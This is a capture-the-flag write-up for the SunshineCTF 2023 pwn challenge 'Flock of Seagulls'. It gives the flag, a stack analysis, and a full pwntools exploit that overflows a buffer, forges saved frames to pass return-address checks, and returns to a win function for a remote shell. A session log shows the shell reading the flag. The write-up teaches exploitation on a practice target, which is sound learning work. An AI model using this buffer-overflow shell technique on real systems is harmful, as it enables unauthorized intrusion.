# Flock of Seagulls

## Description

> **Flock of Seagulls Ode to Seagulls - Chat GPT**
>
> In cyberspace they soar, a flock of seagulls, Guardians of data, with digital goggles. Their eyes keen for threats, they scan the waves, Protecting networks from the darkest caves.
>
> With wings of encryption, they shield the skies, Defenders of secrets, where danger lies. In the realm of code, they glide and dive, Ensuring our data remains alive.
>
> Cyber sentinels, they guard the shore, Against hackers' storms and breaches galore. In unity they fly, with vigilance and grace, These seagulls of security, in cyberspace.
>
> **Server**
>
> nc chal.2023.sunshinectf.games 23002
>
> Attachment: flock

## Flag

sun{here_then_there_then_everywhere}

## Solution

```console
root@kali:~/ctf/SunshineCTF_2023/pwn/Flock_of_Seagulls# checksec flock
[*] '/root/ctf/SunshineCTF_2023/pwn/Flock_of_Seagulls/flock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

root@kali:~/ctf/SunshineCTF_2023/pwn/Flock_of_Seagulls# readelf -s flock | grep win
    40: 00000000004011b9    29 FUNC    GLOBAL DEFAULT   14 win
```

- main -> func1 -> func2 -> func3 -> func4 -> func5

`win` function decompiled with Ghidra:

```c
void win(void)

{
  system("/bin/sh");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

In this challenge, it's expected ret2win.

`func5` function decompiled with Ghidra:

```c
void func5(void)

{
  long unaff_retaddr;
  undefined local_88 [112];
  ssize_t local_18;
  undefined *local_10;
  
  local_10 = local_88;
  printf("<<< Song Begins At %p\n",local_10);
  printf("PwnMe >>> ");
  local_18 = read(0,local_88,500);
  if (unaff_retaddr != 0x401276) {
    fail();
  }
  return;
}
```

`local_88` is defined as 112 bytes but user input is 500 bytes, so There is Buffer Stack Overflow Vulnerability in there.

```gdb
gdb-peda$ b *func5+85
Breakpoint 1 at 0x401248
gdb-peda$ r
(snip)
<<< Song Begins At 0x7fffffffdb40
PwnMe >>> AAAA
(snip)
gdb-peda$ tele 0x7fffffffdb40 50
0000| 0x7fffffffdb40 --> 0xa41414141 ('AAAA\n')
(snip)
0128| 0x7fffffffdbc0 --> 0x7fffffffdbe0 --> 0x7fffffffdc00 --> 0x7fffffffdc20 --> 0x7fffffffdc30 --> 0x7fffffffdc40 (--> ...)
0136| 0x7fffffffdbc8 --> 0x401276 (<func4+13>:  mov    rax,QWORD PTR [rbp+0x8])
(snip)
0160| 0x7fffffffdbe0 --> 0x7fffffffdc00 --> 0x7fffffffdc20 --> 0x7fffffffdc30 --> 0x7fffffffdc40 --> 0x1
0168| 0x7fffffffdbe8 --> 0x4012a0 (<func3+13>:  mov    rax,QWORD PTR [rbp+0x8])
(snip)
0192| 0x7fffffffdc00 --> 0x7fffffffdc20 --> 0x7fffffffdc30 --> 0x7fffffffdc40 --> 0x1
0200| 0x7fffffffdc08 --> 0x4012ca (<func2+13>:  mov    rax,QWORD PTR [rbp+0x8])
(snip)
0224| 0x7fffffffdc20 --> 0x7fffffffdc30 --> 0x7fffffffdc40 --> 0x1
0232| 0x7fffffffdc28 --> 0x4012f0 (<func1+9>:   nop)
(snip)
0248| 0x7fffffffdc38 --> 0x401554 (<main+609>:  mov    eax,0x0)
0256| 0x7fffffffdc40 --> 0x1
(snip)
```

Creating payload so that the stack is in this state and rewriting `main` address to `win` address due to jump to `win` function.

solver.py

```python
from pwn import *

elf = ELF("flock")
rop = ROP(elf)

win = elf.sym["win"]

log.debug(f"win: {hex(win)}")

ret = rop.ret.address


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("chal.2023.sunshinectf.games", 23002)

    elif args.GDB:
        gdbscript = """
        b win
        c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript)

    else:
        io = elf.process()

    return io


def gen_payload(
    f4_call: int,
    f3_call: int,
    f2_call: int,
    f1_call: int,
) -> bytes:
    payload = b""

    payload += b"A" * 128
    payload += p64(f4_call)
    payload += p64(0x401276)  # 0x401276 (<func4+13>:  mov    rax,QWORD PTR [rbp+0x8])

    payload += b"A" * 16
    payload += p64(f3_call)
    payload += p64(0x4012A0)  # 0x4012a0 (<func3+13>:  mov    rax,QWORD PTR [rbp+0x8])

    payload += b"A" * 16
    payload += p64(f2_call)
    payload += p64(0x4012CA)  # 0x4012ca (<func2+13>:  mov    rax,QWORD PTR [rbp+0x8])

    payload += b"A" * 16
    payload += p64(f1_call)
    payload += p64(0x4012F0)  # 0x4012f0 (<func1+9>:   nop)

    payload += b"A" * 8
    payload += p64(ret)
    payload += p64(win)

    return payload


def main():
    io = conn()

    io.recvuntil(b"<<< Song Begins At ")
    song_begin = io.recvline().strip()
    song_begin = int(song_begin, base=16)

    log.info(f"song_begin: {hex(song_begin)}")
    payload = gen_payload(
        song_begin + 160,  # func4
        song_begin + 192,  # func3
        song_begin + 224,  # func2
        song_begin + 240,  # func1
    )

    io.sendlineafter(b"PwnMe >>> ", payload)

    io.interactive()


if __name__ == "__main__":
    main()
```

```console
root@kali:~/ctf/SunshineCTF_2023/pwn/Flock_of_Seagulls# python3 solver.py REMOTE
[*] '/root/ctf/SunshineCTF_2023/pwn/Flock_of_Seagulls/flock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 5 cached gadgets for 'flock'
[+] Opening connection to chal.2023.sunshinectf.games on port 23002: Done
[*] song_begin: 0x7ffe9e7355f0
[*] Switching to interactive mode
$ id
uid=1337(flock) gid=1337(flock) groups=1337(flock)
$ ls -la
total 12
drwxr-xr-x 2 root root  4096 Oct  7 13:57 .
drwxr-xr-x 1 root root  4096 Oct  7 13:57 ..
-rw-r----- 1 root flock   37 Oct  7 13:55 flag.txt
$ cat flag.txt
sun{here_then_there_then_everywhere}
```
